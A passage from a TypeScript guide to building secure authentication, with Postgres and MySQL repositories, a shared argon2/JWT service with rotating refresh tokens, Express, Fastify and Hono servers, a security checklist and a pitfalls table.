  findByEmail(email: string): Promise<User | null>;
  findById(id: string): Promise<User | null>;
  create(data: { email: string; passwordHash: string }): Promise<User>;
}

export interface SessionRepository {
  create(id: string, userId: string, expiresAt: Date): Promise<void>;
  find(id: string): Promise<{ userId: string; expiresAt: Date } | null>;
  destroy(id: string): Promise<void>;
  destroyAllForUser(userId: string): Promise<void>;
}

export interface RefreshTokenRepository {
  create(userId: string, tokenHash: string, expiresAt: Date): Promise<string>; // returns id
  findValid(tokenHash: string): Promise<{ id: string; userId: string } | null>;
  revoke(id: string): Promise<void>;
  revokeAllForUser(userId: string): Promise<void>;
  isRevoked(tokenHash: string): Promise<boolean>; // for reuse detection
}
```

### 18.3 Postgres implementation (using `pg`)

```typescript
// db/postgres.ts
import { Pool } from "pg";

export const pool = new Pool({ connectionString: process.env.DATABASE_URL });
```

```typescript
// repositories/postgres/user.repository.ts
import { pool } from "../../db/postgres";
import type { User, UserRepository } from "../repository.types";

function mapRow(row: any): User {
  return {
    id: row.id,
    email: row.email,
    passwordHash: row.password_hash,
    role: row.role,
    mfaSecret: row.mfa_secret,
    createdAt: row.created_at,
  };
}

export const postgresUserRepository: UserRepository = {
  async findByEmail(email) {
    const { rows } = await pool.query("SELECT * FROM users WHERE email = $1", [
      email,
    ]);
    return rows[0] ? mapRow(rows[0]) : null;
  },
  async findById(id) {
    const { rows } = await pool.query("SELECT * FROM users WHERE id = $1", [
      id,
    ]);
    return rows[0] ? mapRow(rows[0]) : null;
  },
  async create({ email, passwordHash }) {
    const { rows } = await pool.query(
      "INSERT INTO users (email, password_hash) VALUES ($1, $2) RETURNING *",
      [email, passwordHash],
    );
    return mapRow(rows[0]);
  },
};
```

```typescript
// repositories/postgres/refresh-token.repository.ts
import { pool } from "../../db/postgres";
import type { RefreshTokenRepository } from "../repository.types";

export const postgresRefreshTokenRepository: RefreshTokenRepository = {
  async create(userId, tokenHash, expiresAt) {
    const { rows } = await pool.query(
      `INSERT INTO refresh_tokens (user_id, token_hash, expires_at) VALUES ($1, $2, $3) RETURNING id`,
      [userId, tokenHash, expiresAt],
    );
    return rows[0].id;
  },
  async findValid(tokenHash) {
    const { rows } = await pool.query(
      `SELECT id, user_id FROM refresh_tokens WHERE token_hash = $1 AND revoked = false AND expires_at > now()`,
      [tokenHash],
    );
    return rows[0] ? { id: rows[0].id, userId: rows[0].user_id } : null;
  },
  async revoke(id) {
    await pool.query("UPDATE refresh_tokens SET revoked = true WHERE id = $1", [
      id,
    ]);
  },
  async revokeAllForUser(userId) {
    await pool.query(
      "UPDATE refresh_tokens SET revoked = true WHERE user_id = $1",
      [userId],
    );
  },
  async isRevoked(tokenHash) {
    const { rows } = await pool.query(
      "SELECT revoked FROM refresh_tokens WHERE token_hash = $1",
      [tokenHash],
    );
    return rows[0]?.revoked ?? false;
  },
};
```

### 18.4 MySQL implementation (using `mysql2/promise`)

```typescript
// db/mysql.ts
import mysql from "mysql2/promise";

export const pool = mysql.createPool({
  uri: process.env.DATABASE_URL,
  waitForConnections: true,
  connectionLimit: 10, // pool size — critical under serverless/high concurrency, see Section 22
});
```

```typescript
// repositories/mysql/user.repository.ts
import { pool } from "../../db/mysql";
import type { User, UserRepository } from "../repository.types";
import { randomUUID } from "crypto";

function mapRow(row: any): User {
  return {
    id: row.id,
    email: row.email,
    passwordHash: row.password_hash,
    role: row.role,
    mfaSecret: row.mfa_secret,
    createdAt: row.created_at,
  };
}

export const mysqlUserRepository: UserRepository = {
  async findByEmail(email) {
    const [rows]: any = await pool.query(
      "SELECT * FROM users WHERE email = ?",
      [email],
    );
    return rows[0] ? mapRow(rows[0]) : null;
  },
  async findById(id) {
    const [rows]: any = await pool.query("SELECT * FROM users WHERE id = ?", [
      id,
    ]);
    return rows[0] ? mapRow(rows[0]) : null;
  },
  async create({ email, passwordHash }) {
    const id = randomUUID();
    await pool.query(
      "INSERT INTO users (id, email, password_hash) VALUES (?, ?, ?)",
      [id, email, passwordHash],
    );
    const [rows]: any = await pool.query("SELECT * FROM users WHERE id = ?", [
      id,
    ]);
    return mapRow(rows[0]);
  },
};
```

```typescript
// repositories/mysql/refresh-token.repository.ts
import { pool } from "../../db/mysql";
import type { RefreshTokenRepository } from "../repository.types";
import { randomUUID } from "crypto";

export const mysqlRefreshTokenRepository: RefreshTokenRepository = {
  async create(userId, tokenHash, expiresAt) {
    const id = randomUUID();
    await pool.query(
      "INSERT INTO refresh_tokens (id, user_id, token_hash, expires_at) VALUES (?, ?, ?, ?)",
      [id, userId, tokenHash, expiresAt],
    );
    return id;
  },
  async findValid(tokenHash) {
    const [rows]: any = await pool.query(
      "SELECT id, user_id FROM refresh_tokens WHERE token_hash = ? AND revoked = false AND expires_at > NOW()",
      [tokenHash],
    );
    return rows[0] ? { id: rows[0].id, userId: rows[0].user_id } : null;
  },
  async revoke(id) {
    await pool.query("UPDATE refresh_tokens SET revoked = true WHERE id = ?", [
      id,
    ]);
  },
  async revokeAllForUser(userId) {
    await pool.query(
      "UPDATE refresh_tokens SET revoked = true WHERE user_id = ?",
      [userId],
    );
  },
  async isRevoked(tokenHash) {
    const [rows]: any = await pool.query(
      "SELECT revoked FROM refresh_tokens WHERE token_hash = ?",
      [tokenHash],
    );
    return Boolean(rows[0]?.revoked);
  },
};
```

> Swap which repository object you inject (`postgresUserRepository` vs `mysqlUserRepository`) behind a single `DB_DRIVER` env var, and every route/service below works unmodified against either database.

---

## 19. Full Implementation in Express

```typescript
// auth/service.ts — framework-agnostic core logic, shared by all three implementations
import argon2 from "argon2";
import jwt from "jsonwebtoken";
import { randomBytes, createHash, randomUUID } from "crypto";
import type {
  UserRepository,
  RefreshTokenRepository,
} from "../repositories/repository.types";

const ACCESS_TOKEN_TTL = "15m";
const REFRESH_TOKEN_TTL_MS = 7 * 24 * 60 * 60 * 1000;

function hashToken(token: string) {
  return createHash("sha256").update(token).digest("hex"); // fine for random opaque tokens; not a password
}

export function createAuthService(
  users: UserRepository,
  refreshTokens: RefreshTokenRepository,
) {
  return {
    async register(email: string, password: string) {
      const existing = await users.findByEmail(email);
      if (existing) throw new Error("EMAIL_TAKEN");
      const passwordHash = await argon2.hash(password, {
        type: argon2.argon2id,
      });
      return users.create({ email, passwordHash });
    },

    async login(email: string, password: string) {
      const user = await users.findByEmail(email);
      // Constant messaging regardless of which check fails — avoids user enumeration
      if (!user || !(await argon2.verify(user.passwordHash, password))) {
        throw new Error("INVALID_CREDENTIALS");
      }
      const accessToken = jwt.sign(
        { userId: user.id, role: user.role },
        process.env.JWT_SECRET!,
        {
          expiresIn: ACCESS_TOKEN_TTL,
        },
      );
      const rawRefreshToken = randomBytes(40).toString("hex");
      await refreshTokens.create(
        user.id,
        hashToken(rawRefreshToken),
        new Date(Date.now() + REFRESH_TOKEN_TTL_MS),
      );
      return { user, accessToken, refreshToken: rawRefreshToken };
    },

    async refresh(rawRefreshToken: string) {
      const tokenHash = hashToken(rawRefreshToken);
      const record = await refreshTokens.findValid(tokenHash);
      if (!record) {
        // Reuse-detection hook: if this hash matches a *revoked* record, it's theft — see Section 10
        throw new Error("INVALID_REFRESH_TOKEN");
      }
      await refreshTokens.revoke(record.id); // rotate: old one is now dead
      const user = await users.findById(record.userId);
      if (!user) throw new Error("USER_NOT_FOUND");

      const accessToken = jwt.sign(
        { userId: user.id, role: user.role },
        process.env.JWT_SECRET!,
        {
          expiresIn: ACCESS_TOKEN_TTL,
        },
      );
      const newRawRefreshToken = randomBytes(40).toString("hex");
      await refreshTokens.create(
        user.id,
        hashToken(newRawRefreshToken),
        new Date(Date.now() + REFRESH_TOKEN_TTL_MS),
      );
      return { accessToken, refreshToken: newRawRefreshToken };
    },

    async logout(rawRefreshToken: string) {
      const record = await refreshTokens.findValid(hashToken(rawRefreshToken));
      if (record) await refreshTokens.revoke(record.id);
    },

    async logoutAll(userId: string) {
      await refreshTokens.revokeAllForUser(userId);
    },
  };
}
```

```typescript
// server-express.ts
import express from "express";
import cookieParser from "cookie-parser";
import rateLimit from "express-rate-limit";
import jwt from "jsonwebtoken";
import { createAuthService } from "./auth/service";
import { postgresUserRepository } from "./repositories/postgres/user.repository";
import { postgresRefreshTokenRepository } from "./repositories/postgres/refresh-token.repository";
// Swap to mysqlUserRepository / mysqlRefreshTokenRepository to run on MySQL instead — nothing else changes.

const app = express();
app.use(express.json());
app.use(cookieParser());

const authService = createAuthService(
  postgresUserRepository,
  postgresRefreshTokenRepository,
);

const cookieOpts = {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "lax" as const,
  path: "/",
};

const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 });

app.post("/auth/register", async (req, res) => {
  try {
    await authService.register(req.body.email, req.body.password);
    res.status(201).json({ message: "Registered" });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

app.post("/auth/login", loginLimiter, async (req, res) => {
  try {
    const { user, accessToken, refreshToken } = await authService.login(
      req.body.email,
      req.body.password,
    );
    res.cookie("__Host-access", accessToken, {
      ...cookieOpts,
      maxAge: 15 * 60 * 1000,
    });
    res.cookie("__Host-refresh", refreshToken, {
      ...cookieOpts,
      maxAge: 7 * 24 * 60 * 60 * 1000,
    });
    res.json({ user: { id: user.id, email: user.email, role: user.role } });
  } catch {
    res.status(401).json({ error: "Invalid email or password" }); // identical message for both failure modes
  }
});

app.post("/auth/refresh", async (req, res) => {
  try {
    const raw = req.cookies["__Host-refresh"];
    if (!raw) return res.status(401).json({ error: "No refresh token" });
    const { accessToken, refreshToken } = await authService.refresh(raw);
    res.cookie("__Host-access", accessToken, {
      ...cookieOpts,
      maxAge: 15 * 60 * 1000,
    });
    res.cookie("__Host-refresh", refreshToken, {
      ...cookieOpts,
      maxAge: 7 * 24 * 60 * 60 * 1000,
    });
    res.json({ message: "Refreshed" });
  } catch {
    res.status(401).json({ error: "Session expired, please log in again" });
  }
});

app.post("/auth/logout", async (req, res) => {
  const raw = req.cookies["__Host-refresh"];
  if (raw) await authService.logout(raw);
  res.clearCookie("__Host-access", cookieOpts);
  res.clearCookie("__Host-refresh", cookieOpts);
  res.json({ message: "Logged out" });
});

// Middleware: authenticate
function authenticate(
  req: express.Request,
  res: express.Response,
  next: express.NextFunction,
) {
  const token = req.cookies["__Host-access"];
  if (!token) return res.status(401).json({ error: "Not authenticated" });
  try {
    (req as any).user = jwt.verify(token, process.env.JWT_SECRET!);
    next();
  } catch {
    res.status(401).json({ error: "Invalid or expired token" });
  }
}

// Middleware: authorize (RBAC)
function requireRole(...roles: string[]) {
  return (
    req: express.Request,
    res: express.Response,
    next: express.NextFunction,
  ) => {
    if (!roles.includes((req as any).user?.role)) {
      return res.status(403).json({ error: "Insufficient permissions" });
    }
    next();
  };
}

app.get("/api/profile", authenticate, (req, res) =>
  res.json({ user: (req as any).user }),
);
app.delete(
  "/api/users/:id",
  authenticate,
  requireRole("admin"),
  async (req, res) => {
    res.json({ message: `User ${req.params.id} deleted` });
  },
);

app.listen(3000);
```

---

## 20. Full Implementation in Fastify

Fastify's plugin model + schema validation changes the _shape_ of the code, but calls into the exact same `authService` from Section 19 — proving the core logic is genuinely framework-agnostic.

```typescript
// server-fastify.ts
import Fastify from "fastify";
import cookie from "@fastify/cookie";
import rateLimit from "@fastify/rate-limit";
import jwt from "jsonwebtoken";
import { createAuthService } from "./auth/service";
import { mysqlUserRepository } from "./repositories/mysql/user.repository";
import { mysqlRefreshTokenRepository } from "./repositories/mysql/refresh-token.repository";
// Swap to postgresUserRepository / postgresRefreshTokenRepository to run on Postgres instead.

const app = Fastify();
app.register(cookie);
app.register(rateLimit, { global: false }); // apply per-route below

const authService = createAuthService(
  mysqlUserRepository,
  mysqlRefreshTokenRepository,
);

const cookieOpts = {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "lax" as const,
  path: "/",
};

app.post(
  "/auth/register",
  {
    schema: {
      body: {
        type: "object",
        required: ["email", "password"],
        properties: {
          email: { type: "string", format: "email" },
          password: { type: "string", minLength: 12 },
        },
      },
    },
  },
  async (request, reply) => {
    try {
      await authService.register(
        (request.body as any).email,
        (request.body as any).password,
      );
      reply.code(201).send({ message: "Registered" });
    } catch (err: any) {
      reply.code(400).send({ error: err.message });
    }
  },
);

app.post(
  "/auth/login",
  {
    config: { rateLimit: { max: 5, timeWindow: "15 minutes" } },
  },
  async (request, reply) => {
    const { email, password } = request.body as any;
    try {
      const { user, accessToken, refreshToken } = await authService.login(
        email,
        password,
      );
      reply.setCookie("__Host-access", accessToken, {
        ...cookieOpts,
        maxAge: 15 * 60,
      });
      reply.setCookie("__Host-refresh", refreshToken, {
        ...cookieOpts,
        maxAge: 7 * 24 * 60 * 60,
      });
      reply.send({ user: { id: user.id, email: user.email, role: user.role } });
    } catch {
      reply.code(401).send({ error: "Invalid email or password" });
    }
  },
);

app.post("/auth/refresh", async (request, reply) => {
  const raw = request.cookies["__Host-refresh"];
  if (!raw) return reply.code(401).send({ error: "No refresh token" });
  try {
    const { accessToken, refreshToken } = await authService.refresh(raw);
    reply.setCookie("__Host-access", accessToken, {
      ...cookieOpts,
      maxAge: 15 * 60,
    });
    reply.setCookie("__Host-refresh", refreshToken, {
      ...cookieOpts,
      maxAge: 7 * 24 * 60 * 60,
    });
    reply.send({ message: "Refreshed" });
  } catch {
    reply.code(401).send({ error: "Session expired, please log in again" });
  }
});

app.post("/auth/logout", async (request, reply) => {
  const raw = request.cookies["__Host-refresh"];
  if (raw) await authService.logout(raw);
  reply.clearCookie("__Host-access", cookieOpts);
  reply.clearCookie("__Host-refresh", cookieOpts);
  reply.send({ message: "Logged out" });
});

// Auth decorator (Fastify's idiomatic middleware pattern)
app.decorate("authenticate", async (request: any, reply: any) => {
  const token = request.cookies["__Host-access"];
  if (!token) return reply.code(401).send({ error: "Not authenticated" });
  try {
    request.user = jwt.verify(token, process.env.JWT_SECRET!);
  } catch {
    reply.code(401).send({ error: "Invalid or expired token" });
  }
});

function requireRole(...roles: string[]) {
  return async (request: any, reply: any) => {
    if (!roles.includes(request.user?.role)) {
      reply.code(403).send({ error: "Insufficient permissions" });
    }
  };
}

app.get(
  "/api/profile",
  { preHandler: [app.authenticate] },
  async (request: any) => ({ user: request.user }),
);

app.delete(
  "/api/users/:id",
  {
    preHandler: [app.authenticate, requireRole("admin")],
  },
  async (request: any) => ({ message: `User ${request.params.id} deleted` }),
);

app.listen({ port: 3000 });
```

---

## 21. Full Implementation in Hono

Hono's Web-Standard `Context` API and lightweight middleware make it the natural fit for **edge runtimes** (Cloudflare Workers, Vercel Edge, Bun) — same shared `authService`, minor API differences (`c.req`, `c.json()`, `hono/cookie` helpers, `hono/jwt` middleware).

```typescript
// server-hono.ts
import { Hono } from "hono";
import { setCookie, getCookie, deleteCookie } from "hono/cookie";
import { jwt as jwtMiddleware, sign, verify } from "hono/jwt";
import { rateLimiter } from "hono-rate-limiter"; // community middleware
import { createAuthService } from "./auth/service";
import { postgresUserRepository } from "./repositories/postgres/user.repository";
import { postgresRefreshTokenRepository } from "./repositories/postgres/refresh-token.repository";

const app = new Hono();
const authService = createAuthService(
  postgresUserRepository,
  postgresRefreshTokenRepository,
);

const cookieOpts = {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "Lax" as const, // Hono capitalizes the value
  path: "/",
};

app.post("/auth/register", async (c) => {
  const { email, password } = await c.req.json();
  try {
    await authService.register(email, password);
    return c.json({ message: "Registered" }, 201);
  } catch (err: any) {
    return c.json({ error: err.message }, 400);
  }
});

app.post(
  "/auth/login",
  rateLimiter({ windowMs: 15 * 60 * 1000, limit: 5 }),
  async (c) => {
    const { email, password } = await c.req.json();
    try {
      const { user, accessToken, refreshToken } = await authService.login(
        email,
        password,
      );
      setCookie(c, "__Host-access", accessToken, {
        ...cookieOpts,
        maxAge: 15 * 60,
      });
      setCookie(c, "__Host-refresh", refreshToken, {
        ...cookieOpts,
        maxAge: 7 * 24 * 60 * 60,
      });
      return c.json({
        user: { id: user.id, email: user.email, role: user.role },
      });
    } catch {
      return c.json({ error: "Invalid email or password" }, 401);
    }
  },
);

app.post("/auth/refresh", async (c) => {
  const raw = getCookie(c, "__Host-refresh");
  if (!raw) return c.json({ error: "No refresh token" }, 401);
  try {
    const { accessToken, refreshToken } = await authService.refresh(raw);
    setCookie(c, "__Host-access", accessToken, {
      ...cookieOpts,
      maxAge: 15 * 60,
    });
    setCookie(c, "__Host-refresh", refreshToken, {
      ...cookieOpts,
      maxAge: 7 * 24 * 60 * 60,
    });
    return c.json({ message: "Refreshed" });
  } catch {
    return c.json({ error: "Session expired, please log in again" }, 401);
  }
});

app.post("/auth/logout", async (c) => {
  const raw = getCookie(c, "__Host-refresh");
  if (raw) await authService.logout(raw);
  deleteCookie(c, "__Host-access", cookieOpts);
  deleteCookie(c, "__Host-refresh", cookieOpts);
  return c.json({ message: "Logged out" });
});

// Authenticate middleware — reads the JWT out of the cookie manually so we can
// use hono/jwt's verify() while still keeping the token in an httpOnly cookie
// rather than an Authorization header.
async function authenticate(c: any, next: any) {
  const token = getCookie(c, "__Host-access");
  if (!token) return c.json({ error: "Not authenticated" }, 401);
  try {
    const payload = await verify(token, process.env.JWT_SECRET!);
    c.set("user", payload);
    await next();
  } catch {
    return c.json({ error: "Invalid or expired token" }, 401);
  }
}

function requireRole(...roles: string[]) {
  return async (c: any, next: any) => {
    const user = c.get("user");
    if (!roles.includes(user?.role))
      return c.json({ error: "Insufficient permissions" }, 403);
    await next();
  };
}

app.get("/api/profile", authenticate, (c) => c.json({ user: c.get("user") }));
app.delete("/api/users/:id", authenticate, requireRole("admin"), (c) =>
  c.json({ message: `User ${c.req.param("id")} deleted` }),
);

export default app; // Bun.serve / Cloudflare Workers / Vercel Edge all consume this directly
```

> **Note on `hono/jwt`'s `sign`:** it's used identically to `jsonwebtoken`'s `sign` inside the shared `authService` if you want to stay fully within the Hono ecosystem on edge runtimes where Node's `jsonwebtoken` package isn't available — swap the import in `auth/service.ts` behind the same function signature and nothing else changes.

---

## 22. Production Security Checklist

- [ ] Passwords hashed with `argon2id` or `bcrypt` (cost ≥ 12) — never plaintext, never fast general-purpose hashes.
- [ ] Auth cookies use `HttpOnly`, `Secure`, and `SameSite=Lax` (or `Strict`) — ideally with the `__Host-` prefix.
- [ ] All user-generated content is escaped/sanitized on output (and sanitized with `DOMPurify` if raw HTML rendering is required).
- [ ] A strict `Content-Security-Policy` header is set as an XSS safety net.
- [ ] `X-Content-Type-Options: nosniff` and `X-Frame-Options: DENY` (or CSP `frame-ancestors`) are set.
- [ ] Access tokens are short-lived (≤15 min); refresh tokens rotate on every use with reuse detection.
- [ ] Refresh tokens are stored server-side as a **hash**, never in plaintext — same principle as passwords.
- [ ] Session ID is regenerated on login (prevents session fixation).
- [ ] `/auth/login`, `/auth/register`, `/auth/forgot-password` are rate-limited independently, backed by a distributed store (Redis) once running multiple instances.
- [ ] Login failure messages are identical regardless of whether the email exists or the password is wrong.
- [ ] Database connections use pooling (`pg.Pool` / `mysql2` pool) with sane limits — critical to avoid exhausting max connections under serverless concurrency.
- [ ] OAuth flows validate `state` and (ideally) use PKCE; redirect URIs are strictly allowlisted.
- [ ] MFA is available, enforced via a two-step token flow (pending-MFA token → full session only after the second factor).
- [ ] "Log out everywhere" is implemented (revoke all sessions/refresh tokens for a user) and reachable from account security settings.
- [ ] All auth-related failures are logged (without logging the password/token itself) for anomaly detection.
- [ ] Secrets (`JWT_SECRET`, DB credentials, OAuth client secrets) live in environment variables / a secrets manager — never committed to source control — and are rotated periodically.
- [ ] HTTPS is enforced everywhere in production (HSTS header: `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`).

## 23. Common Pitfalls Reference Table

| Mistake                                                                       | Why it's dangerous                                                                                                                | Fix                                                                                |
| ----------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| Storing JWT in `localStorage`                                                 | Fully readable by any XSS payload — instant account takeover                                                                      | Use an `httpOnly` cookie                                                           |
| Omitting `HttpOnly` on session cookies                                        | `document.cookie` exposes it to any injected script                                                                               | Always set `HttpOnly` on auth cookies                                              |
| No `SameSite` attribute                                                       | Cookie is auto-attached on cross-site requests → CSRF                                                                             | Set `SameSite=Lax` at minimum                                                      |
| Comparing passwords with `===`                                                | Not applicable if using bcrypt/argon2's `verify` (which is constant-time) — but a hand-rolled comparison is a timing side-channel | Always use the library's own verify function                                       |
| Long-lived JWTs with no refresh flow                                          | Stolen token stays valid for its full (long) lifetime with no way to revoke                                                       | Short access token + rotating refresh token                                        |
| Reusing the pre-login session ID after authentication                         | Enables session fixation attacks                                                                                                  | Regenerate session ID on login                                                     |
| Rendering user content with `innerHTML`/`dangerouslySetInnerHTML` unsanitized | Direct stored/reflected XSS vector                                                                                                | Escape by default; sanitize explicitly with DOMPurify when raw HTML is required    |
| Rate limiting only by IP                                                      | Attackers rotate IPs trivially; doesn't protect a specific targeted account                                                       | Add per-account lockout with backoff                                               |
| Same error message timing/content leaking user existence                      | Enables account enumeration                                                                                                       | Identical response + similar timing for "no such user" and "wrong password"        |
| One shared DB connection per serverless invocation, no pooling                | Exhausts max DB connections under load, causing outages                                                                           | Use a pooler (PgBouncer, Prisma Accelerate, or driver-level pool with sane limits) |
| Trusting `role`/`permissions` claims in an old JWT after a role change        | Stale privilege persists until token naturally expires                                                                            | Keep access tokens short-lived; re-check critical actions server-side if needed    |
| No `state` validation in OAuth callback                                       | Opens the door to CSRF against the OAuth flow itself                                                                              | Always generate, store, and verify `state`                                         |

---

_This guide is a reference, not a substitute for a security audit on a production system handling sensitive data — pair it with a professional penetration test before launch for anything handling payments, health data, or other regulated information._
